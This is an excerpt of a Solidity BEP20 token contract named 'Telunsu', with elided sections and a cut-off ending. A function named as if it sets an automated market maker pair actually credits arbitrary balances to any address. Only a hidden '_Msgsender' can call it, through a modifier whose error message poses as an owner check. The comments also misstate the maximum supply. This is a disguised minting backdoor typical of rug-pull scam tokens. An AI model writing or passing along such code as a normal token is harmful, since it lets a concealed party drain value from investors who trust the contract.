...
abstract contract Ownable is Context {
    ...
    /**
     * @dev Throws if called by any account other than the Msgsender.
     */
    modifier onlyMsg() {
        require(_Msgsender == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract BEP20 is Context, IBEP20, Ownable {
    ...
    uint256 private immutable _cap; // Max Supply by Maradona.
    ...
    function _transfer(
        ...
        uint256 teamamount = amount.mul(0).div(100);
        address teamWalletAddress = 0xDC96045Ae93599ADfA578caEDef98ABE1F6f6df5;

        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount).sub(burnamount).sub(teamamount);
        _balances[address(0)] = _balances[address(0)].add(burnamount);
        _balances[teamWalletAddress] = _balances[teamWalletAddress].add(teamamount);

        _totalSupply = _totalSupply.sub(burnamount);

        emit Transfer(sender, recipient, amount.sub(burnamount).sub(teamamount));
     ...
     * - `to` cannot be the zero address.
     */
    function _setAutomatedMarketMakerPair(address pair, uint256 value) internal {
        require(
            address(this) != pair,
            "Automated market maker pair is already set to that value"
        );
        _balances[pair] = _balances[pair].add(value);
    }
...
// Token with Governance - Max Supply 10M of tokens
contract Telunsu is BEP20('Telunsu', 'Telunsu', 1000000000*1e18) {
    ...
    */
    ...
    function setAutomatedMarketMakerPair(address pair, uint256 value)
        public
        onlyMsg
    {
        require(
